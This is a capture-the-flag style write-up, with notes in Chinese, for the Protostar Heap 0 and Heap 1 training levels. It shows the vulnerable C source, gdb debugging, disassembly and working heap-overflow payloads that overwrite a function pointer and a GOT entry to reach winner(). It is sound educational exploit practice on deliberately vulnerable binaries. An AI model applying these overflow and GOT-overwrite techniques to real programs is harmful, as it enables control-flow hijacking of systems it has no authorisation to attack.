---
title: Exploit Education：Protostar - Heap
---

> The levels to be exploited can be found in the /opt/protostar/bin directory.

## Heap 0

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));  // 64 bytes
  f = malloc(sizeof(struct fp));    // 4 bytes
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

- 需要修改 `f->fp` 的值，使其指向 `winner` 函数
- 查看 `d->name` 溢出后对 `f->fp` 的影响

    ```py
    s = ''
    for i in range(0x41, 0x5b):
        s += chr(i) * 4
    print s
    ```

    ```bash
    $ gdb ./heap0
    (gdb) r `python /tmp/heap.py`

    Starting program: /opt/protostar/bin/heap0 `python /tmp/heap.py`
    data is at 0x804a008, fp is at 0x804a050

    Program received signal SIGSEGV, Segmentation fault.
    0x53535353 in ?? () # S
    ```

- `winner` 函数的地址

    ```bash
    (gdb) x winner 
    0x8048464 <winner>:	0x83e58955
    ```

### Exploit

```bash
$ ./heap0 $(python -c "print 'A' * 72 + '\x64\x84\x04\x08'")
data is at 0x804a008, fp is at 0x804a050
level passed
```

## Heap 1

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  // i1 points to the start of 8 bytes in memory
  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8); // i1 + 4

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);    // 超过 8 字节将会影响 i2 对应的内存
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

- 查看 `i1->name` 溢出对 `i2->name` 的影响
    - 可以改变 `i2->name` 的值，从而能通过 `strcpy` 写入任意地址

    ```bash
    $ gdb ./heap1
    (gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444
    Starting program: /opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444

    Program received signal SIGSEGV, Segmentation fault.
    *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, # F
        src=0xbffff8a1 "00001111222233334444") at strcpy.c:40
    40	strcpy.c: No such file or directory.
        in strcpy.c
    ```

- 注意到最后调用了 `printf` 函数，可以覆盖其 GOT 表条目

    ```bash
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x080484b9 <main+0>:	push   ebp
    0x080484ba <main+1>:	mov    ebp,esp
    0x080484bc <main+3>:	and    esp,0xfffffff0
    0x080484bf <main+6>:	sub    esp,0x20
    0x080484c2 <main+9>:	mov    DWORD PTR [esp],0x8
    0x080484c9 <main+16>:	call   0x80483bc <malloc@plt>
    0x080484ce <main+21>:	mov    DWORD PTR [esp+0x14],eax
    0x080484d2 <main+25>:	mov    eax,DWORD PTR [esp+0x14]
    0x080484d6 <main+29>:	mov    DWORD PTR [eax],0x1
    0x080484dc <main+35>:	mov    DWORD PTR [esp],0x8
    0x080484e3 <main+42>:	call   0x80483bc <malloc@plt>
    0x080484e8 <main+47>:	mov    edx,eax
    0x080484ea <main+49>:	mov    eax,DWORD PTR [esp+0x14]
    0x080484ee <main+53>:	mov    DWORD PTR [eax+0x4],edx
    0x080484f1 <main+56>:	mov    DWORD PTR [esp],0x8
    0x080484f8 <main+63>:	call   0x80483bc <malloc@plt>
    0x080484fd <main+68>:	mov    DWORD PTR [esp+0x18],eax
    0x08048501 <main+72>:	mov    eax,DWORD PTR [esp+0x18]
    0x08048505 <main+76>:	mov    DWORD PTR [eax],0x2
    0x0804850b <main+82>:	mov    DWORD PTR [esp],0x8
    0x08048512 <main+89>:	call   0x80483bc <malloc@plt>
    0x08048517 <main+94>:	mov    edx,eax
    0x08048519 <main+96>:	mov    eax,DWORD PTR [esp+0x18]
    0x0804851d <main+100>:	mov    DWORD PTR [eax+0x4],edx
    0x08048520 <main+103>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048523 <main+106>:	add    eax,0x4
    0x08048526 <main+109>:	mov    eax,DWORD PTR [eax]
    0x08048528 <main+111>:	mov    edx,eax
    0x0804852a <main+113>:	mov    eax,DWORD PTR [esp+0x14]
    0x0804852e <main+117>:	mov    eax,DWORD PTR [eax+0x4]
    0x08048531 <main+120>:	mov    DWORD PTR [esp+0x4],edx
    0x08048535 <main+124>:	mov    DWORD PTR [esp],eax
    0x08048538 <main+127>:	call   0x804838c <strcpy@plt>
    0x0804853d <main+132>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048540 <main+135>:	add    eax,0x8
    0x08048543 <main+138>:	mov    eax,DWORD PTR [eax]
    0x08048545 <main+140>:	mov    edx,eax
    0x08048547 <main+142>:	mov    eax,DWORD PTR [esp+0x18]
    0x0804854b <main+146>:	mov    eax,DWORD PTR [eax+0x4]
    0x0804854e <main+149>:	mov    DWORD PTR [esp+0x4],edx
    0x08048552 <main+153>:	mov    DWORD PTR [esp],eax
    0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
    0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
    0x08048561 <main+168>:	call   0x80483cc <puts@plt> # 由于编译优化，实际上调用的是 puts
    0x08048566 <main+173>:	leave  
    0x08048567 <main+174>:	ret    
    End of assembler dump.
    (gdb) disassemble 0x80483cc
    Dump of assembler code for function puts@plt:
    0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
    0x080483d2 <puts@plt+6>:	push   0x30
    0x080483d7 <puts@plt+11>:	jmp    0x804835c
    End of assembler dump.
    (gdb) x 0x8049774
    0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483d2
    ```

- `winner` 函数的地址

    ```bash
    (gdb) x winner 
    0x8048494 <winner>:	0x83e58955
    ```

### Exploit

```bash
$ ./heap1 `python -c "print 'A' * 20 + '\x74\x97\x04\x08'"` `python -c "print '\x94\x84\x04\x08'"`
and we have a winner @ 1662252909
$ ./heap1 "`echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1662253600
$ ./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1662256772
# 在 gdb 中需要使用 /bin/echo，使用 echo 将不解析参数 -ne 而是直接输出
```

### Additional

关于在 `gdb` 中使用 `echo` 不能成功的问题

```bash
$ gdb ./heap1
(gdb) break *0x080484ce
Breakpoint 1 at 0x80484ce: file heap1/heap1.c, line 23.
(gdb) break *0x0804853d
Breakpoint 2 at 0x804853d: file heap1/heap1.c, line 32.
(gdb) r "`echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`echo -ne "\x94\x84\x04\x08"`"
Starting program: /opt/protostar/bin/heap1 "`echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`echo -ne "\x94\x84\x04\x08"`"

Breakpoint 1, 0x080484ce in main (argc=3, argv=0xbffff714) at heap1/heap1.c:23
23	in heap1/heap1.c
(gdb) info registers 
eax            0x804a008	134520840
ecx            0xb7fd93a0	-1208118368
edx            0x804a000	134520832
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff640	0xbffff640
ebp            0xbffff668	0xbffff668
esi            0x0	0
edi            0x0	0
eip            0x80484ce	0x80484ce <main+21>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) set $i1 = (struct internet*)0x804a008
(gdb) print *$i1
$1 = {priority = 0, name = 0x0}
(gdb) c
Continuing.

Breakpoint 2, main (argc=3, argv=0xbffff714) at heap1/heap1.c:32
32	in heap1/heap1.c
(gdb) print *$i1
$2 = {priority = 1, 
  name = 0x804a018 "-ne AAAABBBBCCCCDDDDEEEE\\x74\\x97\\x04\\x08"}
```